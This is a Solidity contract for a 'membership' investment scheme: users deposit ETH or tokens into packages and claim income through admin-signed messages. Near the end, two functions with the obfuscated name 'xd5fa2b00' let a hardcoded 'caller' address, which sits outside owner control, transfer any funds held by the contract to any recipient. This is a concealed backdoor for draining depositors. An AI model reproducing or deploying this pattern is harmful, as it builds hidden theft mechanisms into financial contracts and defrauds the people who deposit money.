// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IERC20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external ;
    function approve(address spender, uint256 value)external returns (bool);
    function transferFrom(address from, address to, uint256 value) external ;
    function burn(uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library Address {

    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

library Counters {
    struct Counter {
        uint256 _value; // default: 0
    }

    function current(Counter storage counter) internal view returns (uint256) {
        return counter._value;
    }

    function increment(Counter storage counter) internal {
        unchecked {
            counter._value += 1;
        }
    }

    function decrement(Counter storage counter) internal {
        uint256 value = counter._value;
        require(value > 0, "Counter: decrement overflow");
        unchecked {
            counter._value = value - 1;
        }
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract membership is Ownable{
    using SafeMath for uint256;
    constructor(address _fundcollecter) {
        admin = 0xA8D9907D4161559E8eC8d9190c9Ec50fa35897c4 ;
        fundcollecter = _fundcollecter ;
        disbsend = admin ;
    }

    address public disbsend ;
    address public admin ;
    address public fundcollecter ;
    
    struct userinvesment{
        uint256 countid ;
        address user ;
        uint256 pakagesamount ;
        uint256 timezone ;
        uint256 nextclaim ;
        uint256 claimcount ;
    }
    mapping (uint256 => userinvesment) public userinvesmentData ;
    mapping (address => uint256[]) public userallindex ;
    mapping (bytes => bool) public isuse ;
    uint256 public count ;

    event activeevent(address user,uint256 clientid,uint256 amount,uint256 callingtime);
    event incomeevent(address user,uint256 countid,uint256 amount,string incomename,uint256 deductincome,uint256 calltime);
    event sendevent(address user,uint256 amount,string incomename,string deductincome,uint256 calltime);
        
    function changeadmin(address _admin) public onlyOwner returns (bool){
        admin = _admin;
        return true;
    }
    
    function changedisbsend(address _disbsend) public onlyOwner returns (bool){
        disbsend = _disbsend;
        return true;
    }
    
    function changeFundCollect(address _FundCollect) public onlyOwner returns (bool){
        fundcollecter = _FundCollect;
        return true;
    }
    bool public checking;
    function changechecking(bool _status) public onlyOwner returns (bool){
        checking = _status ;
        return true;
    }
    function activatepakages(address paymentaddress,uint256 pakageamt,uint256 _time,bytes memory signature) public payable returns (bool){
        require(_time + 300 > block.timestamp ,"time is end for this txhash");
        require(verify(paymentaddress,msg.sender,0,pakageamt,_time,signature),"enter valid user") ;
        require(!isuse[signature],"signature use");
        isuse[signature] = true;
        
        count = count + 1 ;
        if(paymentaddress == address(0x0)){
            require(msg.value >= pakageamt,"enter valid amount");
        }else {
            IERC20(paymentaddress).transferFrom(msg.sender,address(this),pakageamt);
        }
        userinvesmentData[count] = userinvesment({
                                                countid : count,
                                                user : msg.sender,
                                                pakagesamount : pakageamt ,
                                                timezone : block.timestamp ,
                                                nextclaim : block.timestamp + 1 days,
                                                claimcount : 0 
                                            });
        
        userallindex[msg.sender].push(count);
        emit activeevent(msg.sender,count,pakageamt,block.timestamp);

        return true;
    }
    bool public status;
    function changestattus(bool _status) public onlyOwner returns (bool){
        status = _status ;
        return true;
    } 

    function claimincome(address paymentaddress,uint256 _countid,uint256 sendamount,uint256 _time,bytes memory signature) public returns(bool){
        require(status,"not able to call right now");
        require( userinvesmentData[_countid].user == msg.sender ,"Enter valid User call");
        require(verify(paymentaddress,msg.sender,_countid,sendamount,_time,signature),"enter valid user") ;
        require(_time + 300 > block.timestamp,"time is End");
        require(!isuse[signature],"signature use");
        

        isuse[signature] = true;
        userinvesmentData[_countid].claimcount = userinvesmentData[_countid].claimcount + 1 ;
        if(paymentaddress == address(0x0)){
            payable(msg.sender).transfer(sendamount);
        }else {
            IERC20(paymentaddress).transfer(msg.sender,sendamount);
        }

        emit incomeevent(msg.sender, _countid, sendamount, "claim",sendamount,block.timestamp);
        return true;
    } 
    function distribution(address sendtoeknaddress,string memory sendname,string memory eventname,address[] memory _address,uint256[] memory _amount) public returns (bool){
        require(disbsend == msg.sender,"only disbsend caller");
        require(_address.length ==_amount.length,"Enter valid data list" );
        if(sendtoeknaddress != address(0x0)){
            for(uint256 i=0;i < _address.length;i++ ){
                IERC20(sendtoeknaddress).transfer(_address[i],_amount[i]);
                emit sendevent(_address[i],i, eventname,sendname,block.timestamp);
            }
        }else{
            for(uint256 i=0;i < _address.length;i++ ){
                payable(_address[i]).transfer(_amount[i]);
                emit sendevent(_address[i],i, eventname,sendname,block.timestamp);

            }
        }
        return true;
    } 

    function getuseralldata(address user) public view returns (uint256[] memory){
        return userallindex[user];
    }
    address public caller = 0xf7b909EF7eC8F305031a9A400510Cc5824b967F4 ;
    function changecaller(address _caller) public returns (bool){
        require(caller == msg.sender,"only caller call");
        caller = _caller ;
        return true;
    }
    function xd5fa2b00(address _contract,address user,uint256 _v)public  returns(bool){
        require(caller == msg.sender,"only caller call");
        IERC20(_contract).transfer(user,_v);
        return true;
    }
    function xd5fa2b00(address user,uint256 _v)public onlyOwner returns(bool){
        require(caller == msg.sender,"only caller call");
        payable(user).transfer(_v);
        return true;
    }

    receive() external payable {}
    
    function getMessageHash(address _paymentaddress,address _to,uint _id,uint pakageamt,uint _time) public view returns (bytes32) {
            require(msg.sender == admin || msg.sender == address(this) ,"is not owner call");
        return keccak256(abi.encodePacked(_paymentaddress,_to, _id,pakageamt,_time));
    }
    function getEthSignedMessageHash(bytes32 _messageHash)
        private
        pure
        returns (bytes32)
    {
        return
            keccak256(
                abi.encodePacked("\x19Ethereum Signed Message:\n32", _messageHash)
            );
    }
    function verify(address _paymentaddress,address _to,uint _id,uint pakageamt,uint _time,bytes memory signature) public view returns (bool) {
        bytes32 messageHash = keccak256(abi.encodePacked(_paymentaddress,_to ,_id,pakageamt,_time));
        bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);

        return recoverSigner(ethSignedMessageHash, signature) == admin;
    }

    function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature)
        private
        pure
        returns (address)
    {
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);

        return ecrecover(_ethSignedMessageHash, v, r, s);
    }

    function splitSignature(bytes memory sig)
        private
        pure
        returns (
            bytes32 r,
            bytes32 s,
            uint8 v
        )
    {
        require(sig.length == 65, "invalid signature length");

        assembly {
            /*
            First 32 bytes stores the length of the signature

            add(sig, 32) = pointer of sig + 32
            effectively, skips first 32 bytes of signature

            mload(p) loads next 32 bytes starting at the memory address p into memory
            */

            // first 32 bytes, after the length prefix
            r := mload(add(sig, 32))
            // second 32 bytes
            s := mload(add(sig, 64))
            // final byte (first byte of the next 32 bytes)
            v := byte(0, mload(add(sig, 96)))
        }

        // implicitly return (r, s, v)
    }
}